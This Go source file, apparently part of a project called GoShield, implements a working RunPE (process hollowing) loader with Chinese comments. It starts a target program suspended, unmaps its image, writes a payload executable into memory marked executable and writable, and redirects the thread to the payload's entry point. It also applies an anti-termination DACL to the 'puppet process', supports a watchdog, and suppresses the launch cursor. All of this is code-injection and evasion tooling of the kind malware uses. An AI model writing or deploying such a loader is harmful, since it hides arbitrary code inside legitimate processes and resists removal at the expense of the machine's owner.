// 文件路径: internal/loader/runpe.go
package loader

import (
	"fmt"
	"syscall"
	"unsafe"

	"github.com/Limkon/GoShield/internal/protect"
)

const (
	CREATE_SUSPENDED        = 0x00000004
	PAGE_EXECUTE_READWRITE  = 0x40
	MEM_COMMIT              = 0x1000
	MEM_RESERVE             = 0x2000
	STARTF_FORCEOFFFEEDBACK = 0x00000080 // 🌟 新增：强制关闭新进程的系统启动反馈（拒绝鼠标转圈）
)

var (
	procGetExitCodeProcess = kernel32.NewProc("GetExitCodeProcess")
	procCloseHandle        = kernel32.NewProc("CloseHandle")
)

// Execute 阻塞运行 PE 字节码，并返回进程退出码 (供幽灵保镖监控使用)
func Execute(targetPath string, payload []byte) (uint32, error) {
	return executeInternal(targetPath, payload, true)
}

// ExecuteAsync 异步运行 PE 字节码，不阻塞 (供父进程献祭前秒启动保镖使用)
func ExecuteAsync(targetPath string, payload []byte) (uint32, error) {
	return executeInternal(targetPath, payload, false)
}

// 核心内部加载引擎
func executeInternal(targetPath string, payload []byte, wait bool) (uint32, error) {
	dosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(&payload[0]))
	if dosHeader.E_magic != 0x5A4D {
		return 0, fmt.Errorf("invalid DOS magic")
	}

	ntHeader := (*IMAGE_NT_HEADERS64)(unsafe.Pointer(&payload[dosHeader.E_lfanew]))
	if ntHeader.Signature != 0x00004550 {
		return 0, fmt.Errorf("invalid NT signature")
	}

	targetPtr, _ := syscall.UTF16PtrFromString(targetPath)

	var si STARTUPINFO
	var pi PROCESS_INFORMATION
	si.Cb = uint32(unsafe.Sizeof(si))
	si.DwFlags = STARTF_FORCEOFFFEEDBACK // 🌟 核心修复点：赋值标志位，彻底消灭转圈等待！

	ret, _, err := procCreateProcessW.Call(
		uintptr(unsafe.Pointer(targetPtr)),
		0, 0, 0, 0,
		uintptr(CREATE_SUSPENDED),
		0, 0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if ret == 0 {
		return 0, fmt.Errorf("CreateProcess failed: %v", err)
	}

	defer procCloseHandle.Call(uintptr(pi.Thread))
	defer procCloseHandle.Call(uintptr(pi.Process))

	// 为生成的傀儡进程立刻套上 DACL 防杀护甲
	protect.ProtectProcessByHandle(pi.Process)

	var pbi PROCESS_BASIC_INFORMATION
	var returnLength uint32
	procNtQueryInformationProcess.Call(
		uintptr(pi.Process),
		0,
		uintptr(unsafe.Pointer(&pbi)),
		uintptr(unsafe.Sizeof(pbi)),
		uintptr(unsafe.Pointer(&returnLength)),
	)

	var hostImageBase uint64
	var bytesRead uintptr
	procReadProcessMemory.Call(
		uintptr(pi.Process),
		pbi.PebBaseAddress+16,
		uintptr(unsafe.Pointer(&hostImageBase)),
		8,
		uintptr(unsafe.Pointer(&bytesRead)),
	)

	payloadImageBase := ntHeader.OptionalHeader.ImageBase
	if hostImageBase == payloadImageBase {
		procNtUnmapViewOfSection.Call(uintptr(pi.Process), uintptr(hostImageBase))
	}

	allocAddress, _, _ := procVirtualAllocEx.Call(
		uintptr(pi.Process),
		uintptr(payloadImageBase),
		uintptr(ntHeader.OptionalHeader.SizeOfImage),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_EXECUTE_READWRITE),
	)
	if allocAddress == 0 {
		return 0, fmt.Errorf("VirtualAllocEx failed")
	}

	var bytesWritten uintptr
	procWriteProcessMemory.Call(
		uintptr(pi.Process),
		allocAddress,
		uintptr(unsafe.Pointer(&payload[0])),
		uintptr(ntHeader.OptionalHeader.SizeOfHeaders),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)

	sectionHeaderOffset := uint32(dosHeader.E_lfanew) + uint32(unsafe.Sizeof(*ntHeader))
	for i := uint16(0); i < ntHeader.FileHeader.NumberOfSections; i++ {
		sectionPtr := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(&payload[sectionHeaderOffset+uint32(i)*uint32(unsafe.Sizeof(IMAGE_SECTION_HEADER{}))]))
		
		if sectionPtr.SizeOfRawData > 0 {
			procWriteProcessMemory.Call(
				uintptr(pi.Process),
				allocAddress+uintptr(sectionPtr.VirtualAddress),
				uintptr(unsafe.Pointer(&payload[sectionPtr.PointerToRawData])),
				uintptr(sectionPtr.SizeOfRawData),
				uintptr(unsafe.Pointer(&bytesWritten)),
			)
		}
	}

	var ctx CONTEXT64
	ctx.ContextFlags = CONTEXT_FULL
	alignCtx := (*CONTEXT64)(unsafe.Pointer((uintptr(unsafe.Pointer(&ctx)) + 15) &^ 15))
	alignCtx.ContextFlags = CONTEXT_FULL

	procGetThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(alignCtx)))

	var newImageBase = uint64(allocAddress)
	procWriteProcessMemory.Call(
		uintptr(pi.Process),
		pbi.PebBaseAddress+16,
		uintptr(unsafe.Pointer(&newImageBase)),
		8,
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	
	alignCtx.Rcx = uint64(allocAddress) + uint64(ntHeader.OptionalHeader.AddressOfEntryPoint)

	procSetThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(alignCtx)))
	procResumeThread.Call(uintptr(pi.Thread))

	if wait {
		procWaitForSingleObject.Call(uintptr(pi.Process), 0xFFFFFFFF)
		var exitCode uint32
		procGetExitCodeProcess.Call(uintptr(pi.Process), uintptr(unsafe.Pointer(&exitCode)))
		return exitCode, nil
	}

	return pi.ProcessId, nil
}
